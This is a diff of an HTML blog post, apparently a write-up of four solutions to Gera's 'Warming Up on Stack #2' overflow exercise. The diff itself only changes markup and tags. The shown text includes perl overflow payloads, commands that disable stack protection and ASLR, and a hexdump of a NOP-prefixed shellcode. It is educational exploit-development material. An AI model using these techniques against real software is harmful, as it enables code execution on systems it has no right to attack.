@@ -72,7 +72,7 @@ int main() {
     through an environment var and overwrite EIP with its address</li>
 </ul>
 <p>Here's a brief description of the test system:</p>
-<pre><code class="console"># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
+<pre><code># cat /etc/lsb-release | grep DESC ; uname -a | cut -d' ' -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E '(vendor|model|flags)'
 DISTRIB_DESCRIPTION=*Ubuntu 10.04.2 LTS*
 Linux 2.6.38 i686 GNU/Linux
 gcc (Ubuntu 4.4.3-4ubuntu5) 4.4.3
@@ -84,7 +84,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 
 <h2>Solution #1: Overflow the internal buf array to overwrite cookie with 0x01020305</h2>
 <p>Here's the GCC commandline to prepare <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> for this solution:</p>
-<pre><code class="console"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack2 stack2.c
+<pre><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack2 stack2.c
 stack2.c: In function ‘main’:
 stack2.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
 stack2.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
@@ -94,7 +94,7 @@ stack2.c:(.text+0x27): warning: the `gets' function is dangerous and should not 
 </code></pre>
 
 <p>All done, let's exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a>:</p>
-<pre><code class="console"># perl -e 'print &quot;A&quot;x80 . &quot;\x05\x03\x02\x01&quot;' | ./stack2
+<pre><code># perl -e 'print &quot;A&quot;x80 . &quot;\x05\x03\x02\x01&quot;' | ./stack2
 buf: bffff4c4 cookie: bffff514
 you win!
 </code></pre>
@@ -126,7 +126,7 @@ you win!
 </code></pre>
 
 <p>The address turns out to be 0x8048479. Let's try exploiting:</p>
-<pre><code class="console"># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack2
+<pre><code># perl -e 'print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;' | ./stack2
 buf: bffff4c4 cookie: bffff514
 you win!
 Segmentation fault
@@ -134,7 +134,7 @@ Segmentation fault
 
 <h2>Solution #3: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address</h2>
 <p>Let's first recompile <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> and request GCC to mark program stack as executable. Additionally, we also need to turn ASLR off so that we can have a static return address to overwrite EIP with:</p>
-<pre><code class="console"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack2 stack2.c 2&gt;/dev/null ; readelf -l stack2 | grep GNU_STACK
+<pre><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack2 stack2.c 2&gt;/dev/null ; readelf -l stack2 | grep GNU_STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
 #
 # echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space
@@ -142,7 +142,7 @@ Segmentation fault
 </code></pre>
 
 <p>Now lets go ahead with exploitation. The Null-free, NOP-prefixed <code>printf(you win!)</code> shellcode we used to exploit <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> in the <a href="https://7h3ram.github.io/posts/20120827_geras-wuos-stack1-solutions.html">Gera's Warming Up on Stack #1 - Solutions</a> post could be reused here:</p>
-<pre><code class="console"># ./stack2
+<pre><code># ./stack2
 buf: bffff4c4 cookie: bffff514
 #
 # ./stack2
@@ -155,7 +155,7 @@ you win!#
 
 <h2>Solution #4: Inject a NOP-prefixed printf(you win!) shellcode through an environment var and overwrite EIP with its address</h2>
 <p>Lets get straight to exploitation:</p>
-<pre><code class="console"># echo $WINCODE | hexdump -C
+<pre><code># echo $WINCODE | hexdump -C
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 20 cd  |..1.1.1.....Y. .|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
 00000020  20 77 69 6e 21 20 0d 0a                           | win! ..|
@@ -171,7 +171,7 @@ you win!
 
 <p>So, we have now successfully exploited the <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack2.html">stack2.c</a> program through four different techniques. Depending on the motive of your exploitation attempt, other techniques could be devised and some, mentioned here, be rejected.</p>
 <p>Like I said, earlier, these solutions are not practical anymore. They just serve the purpose of understanding how exploits used to work before mitigation features were introduced in modern systems. But, as with everything else, understanding basics is really important. As mitigation features mature, exploitation techniques become increasingly complex. And to understand those, we need to build upon the solid foundation of basic concepts, like those discussed on this and other blogs.</p>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a>, <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a> and <a href=/tags.html#writeups>writeups</a>)</p>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#ctf>ctf</a> and <a href=/tags.html#exploit>exploit</a>)</p>
                   <p style="text-align:center;">« <a href="/posts/20120902_tfm-mmplayer-ppl-seh.html">TFM MMPlayer .ppl File Parsing...</a> « | » <a href="/posts/20130103_geras-wuos-stack3-solutions.html">Gera's Warming Up on Stack #3 ...</a> »</p>
             </div>
     <div class="footer">
